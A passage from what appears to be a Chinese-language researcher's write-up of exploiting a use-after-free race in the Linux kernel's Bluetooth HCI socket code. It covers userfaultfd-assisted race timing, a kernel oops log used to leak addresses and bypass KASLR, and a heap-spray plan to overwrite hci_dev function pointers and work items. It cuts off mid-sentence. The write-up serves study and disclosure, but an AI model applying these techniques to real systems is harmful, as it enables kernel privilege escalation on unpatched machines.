黑魔法，我们可以随心所欲的掌控 USING 的线程挂起时间。
    hci_sock_bound_ioctl thread    |    hci_unregister_dev thread
                                   |
                                   |
    if (!hdev)                     |
        return -EBADFD;            |
                                   |
    copy_from_user()               |
    ____________________________   |
                                   |
                                   |    hci_pi(sk)->hdev = NULL;
                                   |    ...
        userfaultfd 挂起            |    hci_dev_put(hdev);
                                   |    ...
                                   |    hci_free_dev(hdev);
    ____________________________   |
    // UAF, for example            |
    hci_dev_lock(hdev);            |
                                   |
                                   |
OK，在可以稳定触发漏洞的基础上，让我们来试着做更多事情吧
> 实话实说，这是我的首个 0 day 利用，写的过程可以说是感慨万千，不过整体而言，跟做一个CTF内核题的区别不大 另外，如下的利用中使用的USING
> thread并非是上文讨论的`hci_sock_bound_ioctl`而是`hci_sock_sendmsg`，其同样也可以用userfaultfd辅助，就不赘述了
### Leaking
想要打穿内核，放到最前面的一个任务便是绕过随机化KASLR，在这一关卡上我是摔了跟斗的，因为当时的我斗气一定想要用另外一个自己发现的[OOB
read](https://marc.info/?l=linux-bluetooth&m=162174982523451&w=2)漏洞来泄露指针。
在错过一次过后（主要是泄露的成功率比较低）便还是拨乱反正，就用这一个洞来同时完成泄露以及内存破坏。原理也很简单：我只要让 USING 线程触发到一个
WARNING 或者碰到内核不会挂掉的页错误即可。
如下是一个可用的NPD造成的泄露。
    [   17.793908] BUG: kernel NULL pointer dereference, address: 0000000000000000
    [   17.794222] #PF: supervisor read access in kernel mode
    [   17.794405] #PF: error_code(0x0000) - not-present page
    [   17.794637] PGD 0 P4D 0
    [   17.794816] Oops: 0000 [#1] SMP NOPTI
    [   17.795043] CPU: 0 PID: 119 Comm: exploit Not tainted 5.12.1 #18
    [   17.795217] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS rel-1.14.0-0-g155821a1990b-prebuilt.qemu.org 04/01/2014
    [   17.795543] RIP: 0010:__queue_work+0xb2/0x3b0
    [   17.795728] Code: 8b 03 eb 2f 83 7c 24 04 40 0f 84 ab 01 00 00 49 63 c4 49 8b 9d 08 01 00 00 49 03 1c c6 4c 89 ff e8 73 fb ff ff 48 85 c0 74 d5  39 030
    [   17.796191] RSP: 0018:ffffac4d8021fc20 EFLAGS: 00000086
    [   17.796329] RAX: ffff9db3013af400 RBX: 0000000000000000 RCX: 0000000000000000
    [   17.796545] RDX: 0000000000000000 RSI: 0000000000000003 RDI: ffffffffbdc4cf10
    [   17.796769] RBP: 000000000000000d R08: ffff9db301400040 R09: ffff9db301400000
    [   17.796926] R10: 0000000000000000 R11: ffffffffbdc4cf18 R12: 0000000000000000
    [   17.797109] R13: ffff9db3021b4c00 R14: ffffffffbdb106a0 R15: ffff9db302260860
    [   17.797328] FS:  00007fa9edf9d740(0000) GS:ffff9db33ec00000(0000) knlGS:0000000000000000
    [   17.797541] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
    [   17.797699] CR2: 0000000000000000 CR3: 000000000225c000 CR4: 00000000001006f0
    [   17.797939] Call Trace:
    [   17.798694]  queue_work_on+0x1b/0x30
    [   17.798865]  hci_sock_sendmsg+0x3bc/0x960
    [   17.798973]  sock_sendmsg+0x56/0x60
    [   17.799081]  sock_write_iter+0x92/0xf0
    [   17.799170]  do_iter_readv_writev+0x145/0x1c0
    [   17.799303]  do_iter_write+0x7b/0x1a0
    [   17.799386]  vfs_writev+0x93/0x160
    [   17.799527]  ? hci_sock_bind+0xbe/0x650
    [   17.799638]  ? __sys_bind+0x8f/0xe0
    [   17.799725]  ? do_writev+0x53/0x120
    [   17.799804]  do_writev+0x53/0x120
    [   17.799882]  do_syscall_64+0x33/0x40
    [   17.799969]  entry_SYSCALL_64_after_hwframe+0x44/0xae
    [   17.800186] RIP: 0033:0x7fa9ee08d35d
    [   17.800405] Code: 28 89 54 24 1c 48 89 74 24 10 89 7c 24 08 e8 ca 26 f9 ff 8b 54 24 1c 48 8b 74 24 10 41 89 c0 8b 7c 24 08 b8 14 00 00 00 0f 05  3d 008
    [   17.800798] RSP: 002b:00007ffe3c870e00 EFLAGS: 00000293 ORIG_RAX: 0000000000000014
    [   17.800969] RAX: ffffffffffffffda RBX: 0000556f50a02f30 RCX: 00007fa9ee08d35d
    [   17.801118] RDX: 0000000000000003 RSI: 00007ffe3c870ea0 RDI: 0000000000000005
    [   17.801267] RBP: 00007ffe3c870ee0 R08: 0000000000000000 R09: 00007fa9edf87700
    [   17.801413] R10: 00007fa9edf879d0 R11: 0000000000000293 R12: 0000556f50a00fe0
    [   17.801560] R13: 00007ffe3c870ff0 R14: 0000000000000000 R15: 0000000000000000
    [   17.801769] Modules linked in:
    [   17.801928] CR2: 0000000000000000
    [   17.802233] ---[ end trace 2bbc14e693eb3d8f ]---    [   17.802373] RIP: 0010:__queue_work+0xb2/0x3b0
    [   17.802492] Code: 8b 03 eb 2f 83 7c 24 04 40 0f 84 ab 01 00 00 49 63 c4 49 8b 9d 08 01 00 00 49 03 1c c6 4c 89 ff e8 73 fb ff ff 48 85 c0 74 d5  39 030
    [   17.802874] RSP: 0018:ffffac4d8021fc20 EFLAGS: 00000086
    [   17.803019] RAX: ffff9db3013af400 RBX: 0000000000000000 RCX: 0000000000000000
    [   17.803166] RDX: 0000000000000000 RSI: 0000000000000003 RDI: ffffffffbdc4cf10
    [   17.803313] RBP: 000000000000000d R08: ffff9db301400040 R09: ffff9db301400000
    [   17.803458] R10: 0000000000000000 R11: ffffffffbdc4cf18 R12: 0000000000000000
    [   17.803605] R13: ffff9db3021b4c00 R14: ffffffffbdb106a0 R15: ffff9db302260860
    [   17.803753] FS:  00007fa9edf9d740(0000) GS:ffff9db33ec00000(0000) knlGS:0000000000000000
    [   17.803921] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
    [   17.804042] CR2: 0000000000000000 CR3: 000000000225c000 CR4: 00000000001006f0
Wow，可以看到寄存器 RDI, R11 以及 R14 都放着非常可疑的内核地址。通过查看 `System.map` 我们发现寄存器 `R14`
正好存放着全局数据对象 `__per_cpu_offset` 的地址 （调试环境下还没有开启KASLR），那么我们可以通过它来计算 KASLR
的偏移，以绕过随机化保护。
    $ cat System.map | grep bdb106a0
    ffffffffbdb106a0 R __per_cpu_offset
### Exploitation
#### RIP hijacking
在KASLR绕过之后，下一个目标便是怎样去劫持控制流。为达此目标，一个UAF漏洞最简单的方式就是基于堆喷去覆盖目标对象上的函数指针，这样子，只要这些被覆写的函数指针被用到的时候，便可以完成控制流劫持了。嗯，思路简单直接，而且这件事情看起来相当容易：因为
`hdev` 对象是 `hci_dev` 结构体，并由 `kmalloc-8k`
的缓存进行维护。由于对象的大小已经如此之大，这使得其所在的缓存相当的稳定，我们很简单的就可以通过像 `setxattr` 这样的方法完成对该目标的占位。
此外，这个结构体的尾巴上实在是有很多可口的函数指针啊
    struct hci_dev {
    ...
        int (*open)(struct hci_dev *hdev);
        int (*close)(struct hci_dev *hdev);
        int (*flush)(struct hci_dev *hdev);
        int (*setup)(struct hci_dev *hdev);
        int (*shutdown)(struct hci_dev *hdev);
        int (*send)(struct hci_dev *hdev, struct sk_buff *skb);
        void (*notify)(struct hci_dev *hdev, unsigned int evt);
        void (*hw_error)(struct hci_dev *hdev, u8 code);
        int (*post_init)(struct hci_dev *hdev);
        int (*set_diag)(struct hci_dev *hdev, bool enable);
        int (*set_bdaddr)(struct hci_dev *hdev, const bdaddr_t *bdaddr);
        void (*cmd_timeout)(struct hci_dev *hdev);
        bool (*prevent_wake)(struct hci_dev *hdev);
    };
好的，在假设我们能堆喷并完全覆盖整个 `hdev` 对象的前提下，我们能完成控制流劫持么？Emmm，事情好像没那么容易，因为 USING
线程的第一现场并没有调用到任何函数指针。
    static int hci_sock_sendmsg(struct socket *sock, struct msghdr *msg,
                    size_t len)
    {
    ...
        hdev = hci_pi(sk)->hdev;
        if (!hdev) {
            err = -EBADFD;
            goto done;
        }
    ...
        if (memcpy_from_msg(skb_put(skb, len), msg, len)) {
            err = -EFAULT;
            goto drop;
        }
        hci_skb_pkt_type(skb) = skb->data[0];
        skb_pull(skb, 1);
        if (hci_pi(sk)->channel == HCI_CHANNEL_USER) {
    ...
        } else if (hci_skb_pkt_type(skb) == HCI_COMMAND_PKT) {
    ...
            if (ogf == 0x3f) {
                skb_queue_tail(&hdev->raw_q, skb);
                queue_work(hdev->workqueue, &hdev->tx_work); // {4}
            } else {
                /* Stand-alone HCI commands must be flagged as
                 * single-command requests.
                 */
                bt_cb(skb)->hci.req_flags |= HCI_REQ_START;
                skb_queue_tail(&hdev->cmd_q, skb);
                queue_work(hdev->workqueue, &hdev->cmd_work); // {5}
            }
        } else {
            if (!capable(CAP_NET_RAW)) {
                err = -EPERM;
                goto drop;
            }
            skb_queue_tail(&hdev->raw_q, skb);
            queue_work(hdev->workqueue, &hdev->tx_work); // {4}
        }
    ...
    }
整个 `hci_sock_sendmsg()` 函数做的事情就是去用户态拿到要发送的数据包，并根据数据包的类型去决定要将 `cmd_work` 还是
`tx_work` 放入工作队列。
诶？工作队列？虽然不是直接的函数调用，这也是和控制流相关的逻辑啊。可能老师傅们已经悟到，可以通过覆盖 `hdev->cmd_work` 或者